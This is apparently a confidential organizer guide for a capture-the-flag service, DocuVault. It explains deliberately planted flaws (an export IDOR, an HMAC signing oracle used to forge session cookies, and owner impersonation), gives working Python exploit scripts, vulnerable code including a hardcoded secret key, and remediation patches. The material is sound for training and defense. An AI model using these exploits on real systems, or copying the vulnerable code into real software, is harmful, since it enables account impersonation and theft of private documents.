# DocuVault — Organizer & Teammate Reference Guide
## Confidential: Intentional Vulnerabilities, Exploit Walkthroughs & Remediation

> **CONFIDENTIAL — ORGANIZER & AUTHOR REFERENCE ONLY**  
> Do not distribute or make publicly accessible to participants during the CTF.

---

### 1. Executive Summary & Flagstore Mapping

| Flagstore  | Difficulty | Module / Feature            | Vulnerability Type                                             | Public Attack Info Provided by Checker          |
| :--------: | :--------: | :-------------------------- | :------------------------------------------------------------- | :---------------------------------------------- |
| **Flag 0** |   ⭐ Easy   | Confidential Workspace Memo | Session Impersonation / Unauthorized Workspace Disclosure      | Victim workspace handle (e.g. `secret_ws_abcd`) |
| **Flag 1** | ⭐⭐ Medium  | Document Exporter           | Cross-Workspace Export Insecure Direct Object Reference (IDOR) | Numerical Document ID                           |
| **Flag 2** |  ⭐⭐⭐ Hard  | Executive Member Bio        | Cryptographic Signature Domain Confusion & Oracle              | Victim Username (e.g. `vault_user_1234`)        |

---

### 1.1 Grounding Model: The `mradu1` vs `mradu2` Benchmark Scenario

Throughout this reference guide, all three flag flows are explained using two concrete participants:

- **Target / Victim (`mradu1` - created by the EnoEngine Checker):**
  - **User ID:** `1`
  - **Username:** `mradu1`
  - **Profile Bio:** `ENO{FLAG2_CONFIDENTIAL_EXECUTIVE_BIO}` *(Holds Flag 2)*
  - **Workspace:** Handle `@mradu1-vault`, Workspace ID `1`, `owner_id = 1`
  - **Document #1:** Title `"Board Strategy Memo"`, Content `ENO{FLAG0_WORKSPACE_MEMO}` *(Holds Flag 0)*, `is_confidential = 1`, `workspace_id = 1`
  - **Document #2:** Title `"Compliance Export Spec"`, Content `ENO{FLAG1_EXPORT_ARTIFACT}` *(Holds Flag 1)*, `is_confidential = 1`, `workspace_id = 1`

- **Competitor / Attacker (`mradu2` - rival team on the CTF network):**
  - **User ID:** `2`
  - **Username:** `mradu2`
  - **Own Workspace:** Handle `@mradu2-space`, Workspace ID `2`, `owner_id = 2`

---

### 2. Flagstore 1: Cross-Workspace Export IDOR (⭐⭐ Medium)

#### Mechanism & Vulnerability
In `service/app/main.py`:
```python
@app.get("/api/workspaces/{workspace_id}/documents/{document_id}/export")
def export_document(workspace_id: int, document_id: int, user=Depends(get_current_user)):
    if not user:
        raise HTTPException(status_code=401, detail="Login required")

    conn = get_db()
    # Step 1: Checks that calling user owns workspace_id
    ws = conn.execute("SELECT id FROM workspaces WHERE id = ? AND owner_id = ?", (workspace_id, user["id"])).fetchone()
    if not ws:
        conn.close()
        raise HTTPException(status_code=403, detail="You do not own this workspace")

    # Step 2: VULNERABILITY! Queries document solely by document_id WITHOUT checking workspace_id!
    doc = conn.execute("SELECT id, title, content, is_confidential FROM documents WHERE id = ?", (document_id,)).fetchone()
    conn.close()
    if not doc:
        raise HTTPException(status_code=404, detail="Document not found")

    return {"exported_by": user["username"], "document": dict(doc)}
```

1. **Root Cause:**  
   The export endpoint properly verifies that the authenticated user owns `workspace_id`. However, the subsequent document lookup executes `SELECT ... FROM documents WHERE id = ?` using only `document_id`. It **never checks** that `document.workspace_id == workspace_id`!
2. **How to Exploit:**  
   Any authenticated attacker can create their own legitimate workspace (e.g. `my_workspace_id = 12`). Then, the attacker requests:
   `GET /api/workspaces/12/documents/<VICTIM_DOCUMENT_ID>/export`
   The authorization check passes because the attacker owns workspace `12`, and the server returns the victim's confidential document in the JSON response!

#### Concrete Walkthrough: `mradu1` vs `mradu2` (Flag 1)
1. **Target Setup:** `mradu1` creates Document #2 with content `ENO{FLAG1_EXPORT_ARTIFACT}` located in Workspace #1.
2. **Attacker Setup:** `mradu2` registers on the service (`user_id = 2`) and creates their own workspace `@mradu2-space` (`workspace_id = 2`).
3. **Execution:** `mradu2` sends an export query referencing **their own workspace** but **mradu1's document index**:
   ```http
   GET /api/workspaces/2/documents/2/export
   ```
4. **What Happens Internally:**
   - `SELECT ... FROM workspaces WHERE id = 2 AND owner_id = 2` passes because `mradu2` owns Workspace #2.
   - The document lookup runs `SELECT ... FROM documents WHERE id = 2` without checking `workspace_id`.
   - The server packages Document #2 (owned by `mradu1`) and sends it back to `mradu2`.
5. **Outcome:** `mradu2` extracts `ENO{FLAG1_EXPORT_ARTIFACT}` without needing any permissions in `mradu1`'s workspace.

#### Reproduction & Exploit Script
```python
import requests

s = requests.Session()
# 1. Register attacker account
s.post("http://<target>:8000/api/register", data={"username": "attacker", "password": "password123"})

# 2. Create attacker's own workspace
ws = s.post("http://<target>:8000/api/workspaces", data={"handle": "attacker-ws", "name": "Attacker Vault", "is_private": "true"}).json()
my_ws_id = ws["id"]

# 3. Exploit IDOR to extract victim document (e.g. doc_id = 5)
target_doc_id = 5
resp = s.get(f"http://<target>:8000/api/workspaces/{my_ws_id}/documents/{target_doc_id}/export")
print("Stolen Flag 1:", resp.json()["document"]["content"])
```

#### Remediation / Defense
Ensure the document query restricts lookups to documents strictly belonging to the verified `workspace_id`:
```python
@app.get("/api/workspaces/{workspace_id}/documents/{document_id}/export")
def export_document(workspace_id: int, document_id: int, user=Depends(get_current_user)):
    ...
    doc = conn.execute(
        "SELECT id, title, content, is_confidential FROM documents WHERE id = ? AND workspace_id = ?",
        (document_id, workspace_id)
    ).fetchone()
    ...
```

---

### 3. Flagstore 2: Cryptographic Signature Domain Confusion & Oracle (⭐⭐⭐ Hard)

#### Mechanism & Vulnerability
In `service/app/auth.py`:
```python
SECRET_KEY = os.getenv("SECRET_KEY", "docuvault_master_secret_2026_xyz").encode()

def sign_token(identifier: str | int) -> str:
    return hmac.new(SECRET_KEY, str(identifier).encode(), hashlib.sha256).hexdigest()

def verify_token(identifier: str | int, signature: str) -> bool:
    expected = sign_token(identifier)
    return hmac.compare_digest(expected, signature)
```

And in `service/app/main.py`:
```python
# 1. Session verification:
def get_current_user(request: Request):
    user_id = request.cookies.get("user_id")
    sig = request.cookies.get("session_sig")
    if not user_id or not sig:
        return None
    if not verify_token(user_id, sig):
        return None
    ...

# 2. Share link generation:
@app.get("/api/documents/{doc_id}/share-link")
def create_share_link(doc_id: int, user=Depends(get_current_user)):
    if not user:
        raise HTTPException(status_code=401, detail="Login required")

    sig = sign_token(doc_id)
    return {"share_url": f"/share?doc_id={doc_id}&sig={sig}", "doc_id": doc_id, "sig": sig}
```

1. **Root Cause:**  
   - **Lack of Cryptographic Domain Separation:** The server uses the exact same function `sign_token(identifier)` and identical `SECRET_KEY` for **both session cookies** (`user_id`, `session_sig`) and **document share links** (`doc_id`, `sig`).
   - **Arbitrary Signing Oracle:** `/api/documents/{doc_id}/share-link` does not verify if `doc_id` is a real document or if the user owns it. It blindly computes `sign_token(doc_id)` for any integer passed in the URL.
2. **How to Exploit:**  
   - Flag 2 is stored in the victim user's `bio` column.
   - An attacker wants to forge a session cookie for `user_id = <victim_user_id>`.
   - The attacker calls:
     `GET /api/documents/<victim_user_id>/share-link`
   - The server computes `sig = sign_token(victim_user_id)` and returns it in the JSON response.
   - The attacker sets their browser/script cookies to:
     `user_id=<victim_user_id>; session_sig=<sig>`
   - The attacker calls `GET /api/me`. The server accepts the forged session and returns the victim's user object:
     `{"id": victim_user_id, "username": "victim", "bio": "ENO{FLAG2_...}"}`.

#### Concrete Walkthrough: `mradu1` vs `mradu2` (Flag 2)
1. **Target Setup:** `mradu1` registers first and receives `user_id = 1` with their executive bio set to `ENO{FLAG2_CONFIDENTIAL_EXECUTIVE_BIO}`.
2. **Attacker Setup:** `mradu2` registers (`user_id = 2`) and holds legitimate session cookies (`user_id=2`, `session_sig=HMAC("2")`).
3. **Querying the Oracle:**
   - While logged in, `mradu2` sends a request to the document share-signing endpoint using `mradu1`'s User ID (`1`):
     ```http
     GET /api/documents/1/share-link
     ```
   - The server blindly runs `sign_token(1)`:
     $$\text{sig} = \text{HMAC}(\text{SECRET\_KEY}, \text{"1"})$$
   - The server returns `{"sig": "9df5ec...", "doc_id": 1}`.
4. **Session Forgery:**
   - `mradu2` updates their browser/request cookies to:
     - `user_id = 1`
     - `session_sig = 9df5ec...`
5. **Outcome:**
   - `mradu2` sends `GET /api/me`.
   - The server's `get_current_user` checks: `verify_token("1", "9df5ec...")` $\rightarrow$ **VALID**.
   - The server treats `mradu2` as `mradu1` and returns `mradu1`'s profile containing `ENO{FLAG2_CONFIDENTIAL_EXECUTIVE_BIO}`.

#### Reproduction & Exploit Script
```python
import requests

s = requests.Session()
# 1. Register attacker account to get valid login
s.post("http://<target>:8000/api/register", data={"username": "attacker", "password": "password123"})

# 2. Target victim user ID (e.g. user_id = 2)
target_user_id = 2

# 3. Query signing oracle
oracle_resp = s.get(f"http://<target>:8000/api/documents/{target_user_id}/share-link").json()
forged_sig = oracle_resp["sig"]

# 4. Impersonate victim user via forged session cookie
impersonation_session = requests.Session()
impersonation_session.cookies.set("user_id", str(target_user_id))
impersonation_session.cookies.set("session_sig", forged_sig)

# 5. Extract victim bio containing Flag 2
profile = impersonation_session.get("http://<target>:8000/api/me").json()
print("Stolen Flag 2 (Bio):", profile["bio"])
```

#### Remediation / Defense
1. **Domain Separation in Signatures:** Prefix the token with its context type so a document signature cannot be replayed as a user session:
   ```python
   def sign_session_token(user_id: int | str) -> str:
       return hmac.new(SECRET_KEY, f"session:{user_id}".encode(), hashlib.sha256).hexdigest()

   def sign_share_token(doc_id: int | str) -> str:
       return hmac.new(SECRET_KEY, f"share:{doc_id}".encode(), hashlib.sha256).hexdigest()
   ```
2. **Access Control in Share Link Endpoint:** Verify document existence and workspace ownership before signing:
   ```python
   @app.get("/api/documents/{doc_id}/share-link")
   def create_share_link(doc_id: int, user=Depends(get_current_user)):
       if not user:
           raise HTTPException(status_code=401, detail="Login required")
       conn = get_db()
       doc = conn.execute("""
           SELECT d.id FROM documents d
           JOIN workspaces w ON d.workspace_id = w.id
           WHERE d.id = ? AND w.owner_id = ?
       """, (doc_id, user["id"])).fetchone()
       conn.close()
       if not doc:
           raise HTTPException(status_code=403, detail="Unauthorized")
       sig = sign_share_token(doc_id)
       return {"share_url": f"/share?doc_id={doc_id}&sig={sig}", "doc_id": doc_id, "sig": sig}
   ```

---

### 4. Flagstore 0: Confidential Workspace Memo (⭐ Easy)

#### Mechanism & Vulnerability
- **Flag 0** is stored inside a confidential document (`is_confidential = 1`) within the victim's workspace.
- The round's public `attack_info` distributes the victim's workspace `handle` (e.g. `secret_ws_abcd`).
- When a user visits `GET /api/workspaces/{handle}`, the server checks:
  ```python
  is_owner = (user is not None and user["id"] == ws["owner_id"])
  if is_owner:
      docs = conn.execute("SELECT ... FROM documents WHERE workspace_id = ?", (ws["id"],)).fetchall()
  else:
      docs = conn.execute("SELECT ... FROM documents WHERE workspace_id = ? AND is_confidential = 0", (ws["id"],)).fetchall()
  ```
- **Exploitation Path:**
  1. The attacker looks up the target workspace handle to determine `workspace_id` and `owner_id`.
  2. Using the Signature Oracle vulnerability from Flag 2, the attacker obtains `sign_token(owner_id)`.
  3. The attacker sets `user_id = owner_id; session_sig = sig` to impersonate the workspace owner.
  4. The attacker accesses `GET /api/workspaces/{handle}` as the owner, unlocking all confidential documents and retrieving Flag 0!

#### Concrete Walkthrough: `mradu1` vs `mradu2` (Flag 0)
1. **Target Setup:** `mradu1` owns private workspace `@mradu1-vault` (Workspace ID `1`, `owner_id = 1`) containing confidential Document #1 with content `ENO{FLAG0_WORKSPACE_MEMO}`.
2. **Normal Behavior (Protected):**
   - If `mradu2` views `GET /api/workspaces/mradu1-vault` with their own session, `is_owner = (2 == 1)` evaluates to **False**.
   - The server executes `SELECT ... WHERE workspace_id = 1 AND is_confidential = 0`.
   - Confidential Document #1 is filtered out, returning an empty document list.
3. **Execution via Session Impersonation:**
   - `mradu2` inspects the workspace metadata to find `owner_id = 1`.
   - Using the Flag 2 signing oracle, `mradu2` calls `GET /api/documents/1/share-link` to obtain `sig = HMAC("1")`.
   - `mradu2` sets session cookies: `user_id = 1` and `session_sig = sig`.
4. **Outcome:**
   - `mradu2` visits `GET /api/workspaces/mradu1-vault`.
   - The server checks `user["id"] == ws["owner_id"]` (`1 == 1` $\rightarrow$ **True**).
   - Because `is_owner` is True, the server fetches all documents without confidentiality filtering, revealing Document #1 and `ENO{FLAG0_WORKSPACE_MEMO}`.

#### Remediation / Defense
Patching the Signature Oracle (Domain Separation) directly protects Flag 0 from unauthorized retrieval, enforcing strict confidentiality boundaries across workspaces.
